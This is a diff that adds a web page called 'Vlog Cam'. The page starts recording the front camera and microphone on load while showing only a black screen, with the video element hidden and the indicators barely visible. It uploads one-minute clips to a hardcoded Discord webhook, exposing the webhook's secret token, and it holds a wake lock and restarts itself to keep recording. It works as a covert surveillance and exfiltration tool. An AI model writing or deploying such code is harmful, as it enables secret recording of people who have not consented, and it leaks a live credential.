@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Vlog Cam</title>
+    <style>
+        /* ── reset & blackout ── */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+            color: #fff;
+            font-family: system-ui, -apple-system, sans-serif;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        /* hidden video element – needed for the stream to stay alive */
+        #video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* fullscreen black canvas – tap target */
+        #screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 1;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ── clip counter – bottom right ── */
+        #counter {
+            position: fixed;
+            bottom: 32px;
+            right: 24px;
+            z-index: 2;
+            font-size: 15px;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.25);
+            letter-spacing: 0.3px;
+            pointer-events: none;
+            font-variant-numeric: tabular-nums;
+            transition: opacity 0.6s;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 6px 14px;
+            border-radius: 20px;
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* status text – only shown on error */
+        #status {
+            position: fixed;
+            bottom: 40px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.15);
+            z-index: 2;
+            pointer-events: none;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: 0.3px;
+            padding: 0 20px;
+            transition: opacity 0.8s;
+        }
+        #status.error {
+            color: rgba(255, 70, 70, 0.6);
+            font-weight: 500;
+        }
+
+        /* fullscreen override */
+        #screen:-webkit-full-screen {
+            background: #000;
+        }
+        #screen:fullscreen {
+            background: #000;
+        }
+
+        /* prevent any text selection / highlight */
+        ::selection {
+            background: transparent;
+        }
+        ::-moz-selection {
+            background: transparent;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- hidden video element -->
+    <video id="video" autoplay playsinline muted></video>
+
+    <!-- tap target – full black -->
+    <div id="screen" role="button" aria-label="Toggle fullscreen"></div>
+
+    <!-- clip counter – bottom right -->
+    <div id="counter">◉ 0 clips sent</div>
+
+    <!-- status (only shown on error) -->
+    <div id="status">● ready</div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ─── CONFIG ────────────────────────────────────────────────
+            const WEBHOOK = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
+
+            const CLIP_DURATION_MS = 60000; // 1 minute
+            const BITRATE = 3000000; // 3 Mbps – keeps files under Discord's 25 MB limit
+            const MIME_TYPES = [
+                'video/webm;codecs=vp9',
+                'video/webm;codecs=vp8',
+                'video/webm;codecs=h264',
+                'video/webm'
+            ];
+
+            // ─── DOM REFS ──────────────────────────────────────────────
+            const videoEl = document.getElementById('video');
+            const screenEl = document.getElementById('screen');
+            const counterEl = document.getElementById('counter');
+            const statusEl = document.getElementById('status');
+
+            // ─── STATE ─────────────────────────────────────────────────
+            let stream = null;
+            let recorder = null;
+            let chunks = [];
+            let clipCounter = 0;
+            let isRecording = false;
+            let isPaused = false;
+            let clipTimer = null;
+
+            // ─── HELPERS ───────────────────────────────────────────────
+
+            function setStatus(msg, isError = false) {
+                statusEl.textContent = msg;
+                statusEl.className = isError ? 'error' : '';
+                if (!isError) {
+                    clearTimeout(statusEl._fadeTimer);
+                    statusEl.style.opacity = '1';
+                    statusEl._fadeTimer = setTimeout(() => {
+                        statusEl.style.opacity = '0.2';
+                    }, 6000);
+                } else {
+                    statusEl.style.opacity = '1';
+                }
+            }
+
+            function updateCounter() {
+                counterEl.textContent = `◉ ${clipCounter} clip${clipCounter !== 1 ? 's' : ''} sent`;
+                // subtle pulse on new clip
+                counterEl.style.transition = 'transform 0.15s, color 0.3s';
+                counterEl.style.transform = 'scale(1.08)';
+                counterEl.style.color = 'rgba(255,255,255,0.5)';
+                setTimeout(() => {
+                    counterEl.style.transform = 'scale(1)';
+                    counterEl.style.color = 'rgba(255,255,255,0.25)';
+                }, 200);
+            }
+
+            function showError(msg) {
+                console.error('[VlogCam]', msg);
+                setStatus('⚠ ' + msg, true);
+                isPaused = true;
+            }
+
+            function clearError() {
+                isPaused = false;
+                setStatus('● recording', false);
+            }
+
+            // ─── FULLSCREEN ────────────────────────────────────────────
+
+            function toggleFullscreen() {
+                try {
+                    if (!document.fullscreenElement) {
+                        const el = document.documentElement;
+                        if (el.requestFullscreen) {
+                            el.requestFullscreen().catch(() => {});
+                        } else if (el.webkitRequestFullscreen) {
+                            el.webkitRequestFullscreen();
+                        } else if (el.msRequestFullscreen) {
+                            el.msRequestFullscreen();
+                        }
+                    } else {
+                        if (document.exitFullscreen) {
+                            document.exitFullscreen().catch(() => {});
+                        } else if (document.webkitExitFullscreen) {
+                            document.webkitExitFullscreen();
+                        } else if (document.msExitFullscreen) {
+                            document.msExitFullscreen();
+                        }
+                    }
+                } catch (_) { /* ignore */ }
+            }
+
+            screenEl.addEventListener('click', toggleFullscreen);
+            screenEl.addEventListener('touchstart', (e) => {
+                if (e.touches.length === 1) {
+                    e.preventDefault();
+                    toggleFullscreen();
+                }
+            }, { passive: false });
+
+            // ─── CAMERA / RECORDING ───────────────────────────────────
+
+            async function getCameraStream() {
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                };
+
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia(constraints);
+                    const track = s.getVideoTracks()[0];
+                    if (track) {
+                        const settings = track.getSettings();
+                        console.log('[VlogCam] camera:', {
+                            label: track.label,
+                            facingMode: settings.facingMode,
+                            width: settings.width,
+                            height: settings.height,
+                            frameRate: settings.frameRate
+                        });
+                        if (settings.facingMode !== 'user') {
+                            console.warn('[VlogCam] warning: facingMode is', settings.facingMode, 'not "user"');
+                        }
+                    }
+                    return s;
+                } catch (err) {
+                    console.error('[VlogCam] getUserMedia failed:', err);
+                    try {
+                        const fallbackConstraints = {
+                            video: { facingMode: 'user' },
+                            audio: true
+                        };
+                        const s2 = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                        console.warn('[VlogCam] using fallback constraints');
+                        return s2;
+                    } catch (err2) {
+                        throw new Error('Camera unavailable: ' + (err2.message || err2.name));
+                    }
+                }
+            }
+
+            function getSupportedMimeType() {
+                for (const mt of MIME_TYPES) {
+                    if (MediaRecorder.isTypeSupported(mt)) {
+                        return mt;
+                    }
+                }
+                return null;
+            }
+
+            function startRecorder(mediaStream) {
+                chunks = [];
+
+                const mimeType = getSupportedMimeType();
+                const options = {
+                    mimeType: mimeType || undefined,
+                    videoBitsPerSecond: BITRATE,
+                    audioBitsPerSecond: 128000
+                };
+
+                try {
+                    const rec = new MediaRecorder(mediaStream, options);
+                    rec.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) {
+                            chunks.push(e.data);
+                        }
+                    };
+
+                    rec.onstop = () => {
+                        if (chunks.length === 0) {
+                            console.warn('[VlogCam] no data in clip, skipping upload');
+                            scheduleNextClip();
+                            return;
+                        }
+
+                        const blob = new Blob(chunks, {
+                            type: mimeType || 'video/webm'
+                        });
+                        console.log('[VlogCam] clip ready:', {
+                            size: (blob.size / 1024 / 1024).toFixed(2) + ' MB',
+                            type: blob.type,
+                            clip: clipCounter + 1
+                        });
+
+                        uploadToDiscord(blob)
+                            .finally(() => {
+                                chunks = [];
+                                scheduleNextClip();
+                            });
+                    };
+
+                    rec.onerror = (e) => {
+                        console.error('[VlogCam] MediaRecorder error:', e);
+                        showError('Recording error – restarting');
+                        chunks = [];
+                        setTimeout(() => {
+                            if (stream) {
+                                try {
+                                    recorder = null;
+                                    startRecorder(stream);
+                                } catch (_) {
+                                    restartCamera();
+                                }
+                            } else {
+                                restartCamera();
+                            }
+                        }, 2000);
+                    };
+
+                    rec.start(1000);
+                    return rec;
+                } catch (err) {
+                    console.error('[VlogCam] MediaRecorder init failed:', err);
+                    throw new Error('Cannot start recording: ' + err.message);
+                }
+            }
+
+            function scheduleNextClip() {
+                if (clipTimer) {
+                    clearTimeout(clipTimer);
+                    clipTimer = null;
+                }
+
+                if (!stream || !isRecording) return;
+
+                clipTimer = setTimeout(() => {
+                    clipTimer = null;
+                    if (stream && isRecording) {
+                        try {
+                            recorder = startRecorder(stream);
+                            const stopTimer = setTimeout(() => {
+                                if (recorder && recorder.state === 'recording') {
+                                    try { recorder.stop(); } catch (_) {}
+                                }
+                            }, CLIP_DURATION_MS);
+                            recorder._stopTimer = stopTimer;
+                        } catch (err) {
+                            console.error('[VlogCam] failed to start recorder:', err);
+                            showError('Recorder failed – retrying...');
+                            setTimeout(() => {
+                                if (stream) {
+                                    try {
+                                        recorder = startRecorder(stream);
+                                        clearError();
+                                    } catch (_) {
+                                        restartCamera();
+                                    }
+                                } else {
+                                    restartCamera();
+                                }
+                            }, 3000);
+                        }
+                    }
+                }, 300);
+            }
+
+            // ─── UPLOAD ────────────────────────────────────────────────
+
+            async function uploadToDiscord(blob) {
+                const filename = `clip_${String(++clipCounter).padStart(4, '0')}.webm`;
+
+                const formData = new FormData();
+                formData.append('file', blob, filename);
+
+                const now = new Date();
+                const timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
+                formData.append('content', `🎥 Clip #${clipCounter} · ${timestamp}`);
+
+                try {
+                    setStatus(`⬆ uploading #${clipCounter}...`, false);
+
+                    const response = await fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        const text = await response.text().catch(() => '');
+                        throw new Error(`Discord ${response.status}: ${text.substring(0, 100)}`);
+                    }
+
+                    console.log('[VlogCam] uploaded clip #' + clipCounter);
+                    setStatus(`✓ clip #${clipCounter} sent`, false);
+                    updateCounter();
+
+                } catch (err) {
+                    console.error('[VlogCam] upload failed:', err);
+                    setStatus(`✗ upload #${clipCounter} failed`, true);
+                    // decrement counter so it retries with same number
+                    clipCounter--;
+                    throw err;
+                }
+            }
+
+            // ─── RESTART / RECOVERY ────────────────────────────────────
+
+            async function restartCamera() {
+                console.log('[VlogCam] restarting camera...');
+                setStatus('reconnecting...', false);
+                isRecording = false;
+
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    stream = null;
+                }
+                if (recorder) {
+                    try { recorder.stop(); } catch (_) {}
+                    recorder = null;
+                }
+                if (clipTimer) {
+                    clearTimeout(clipTimer);
+                    clipTimer = null;
+                }
+                chunks = [];
+
+                try {
+                    stream = await getCameraStream();
+                    videoEl.srcObject = stream;
+                    await videoEl.play().catch(() => {});
+
+                    isRecording = true;
+                    clearError();
+
+                    recorder = startRecorder(stream);
+                    const stopTimer = setTimeout(() => {
+                        if (recorder && recorder.state === 'recording') {
+                            try { recorder.stop(); } catch (_) {}
+                        }
+                    }, CLIP_DURATION_MS);
+                    recorder._stopTimer = stopTimer;
+
+                    console.log('[VlogCam] recording started');
+                } catch (err) {
+                    showError('Camera error: ' + err.message);
+                    setTimeout(() => {
+                        if (!isRecording) {
+                            restartCamera();
+                        }
+                    }, 5000);
+                }
+            }
+
+            // ─── WAKE LOCK ─────────────────────────────────────────────
+
+            let wakeLock = null;
+
+            async function requestWakeLock() {
+                try {
+                    if ('wakeLock' in navigator) {
+                        wakeLock = await navigator.wakeLock.request('screen');
+                        wakeLock.addEventListener('release', () => {
+                            console.log('[VlogCam] wake lock released');
+                        });
+                        console.log('[VlogCam] wake lock active');
+                    }
+                } catch (err) {
+                    console.warn('[VlogCam] wake lock not available:', err);
+                }
+            }
+
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible' && isRecording) {
+                    requestWakeLock().catch(() => {});
+                }
+            });
+
+            // ─── INIT ──────────────────────────────────────────────────
+
+            async function init() {
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        throw new Error('MediaDevices API not supported');
+                    }
+                    if (typeof MediaRecorder === 'undefined') {
+                        throw new Error('MediaRecorder not supported');
+                    }
+
+                    setStatus('starting camera...', false);
+
+                    stream = await getCameraStream();
+                    videoEl.srcObject = stream;
+                    await videoEl.play().catch(() => {});
+
+                    await requestWakeLock().catch(() => {});
+
+                    isRecording = true;
+                    clearError();
+
+                    recorder = startRecorder(stream);
+                    const stopTimer = setTimeout(() => {
+                        if (recorder && recorder.state === 'recording') {
+                            try { recorder.stop(); } catch (_) {}
+                        }
+                    }, CLIP_DURATION_MS);
+                    recorder._stopTimer = stopTimer;
+
+                    console.log('[VlogCam] ready, recording 1080p30fps from front camera');
+                    setStatus('● recording', false);
+
+                } catch (err) {
+                    showError(err.message || 'init failed');
+                    setTimeout(() => {
+                        if (!isRecording) {
+                            init();
+                        }
+                    }, 5000);
+                }
+            }
+
+            // ─── CLEANUP ───────────────────────────────────────────────
+
+            window.addEventListener('beforeunload', () => {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                }
+                if (recorder) {
+                    try { recorder.stop(); } catch (_) {}
+                }
+                if (clipTimer) {
+                    clearTimeout(clipTimer);
+                }
+                if (wakeLock) {
+                    try { wakeLock.release(); } catch (_) {}
+                }
+            });
+
+            // ─── GO ────────────────────────────────────────────────────
+
+            setTimeout(init, 300);
+
+            window.__vlog = {
+                getState: () => ({
+                    isRecording,
+                    isPaused,
+                    clipCounter,
+                    chunks: chunks.length,
+                    stream: !!stream,
+                    recorder: !!recorder
+                })
+            };
+
+        })();
+    </script>
+
+</body>
+</html>
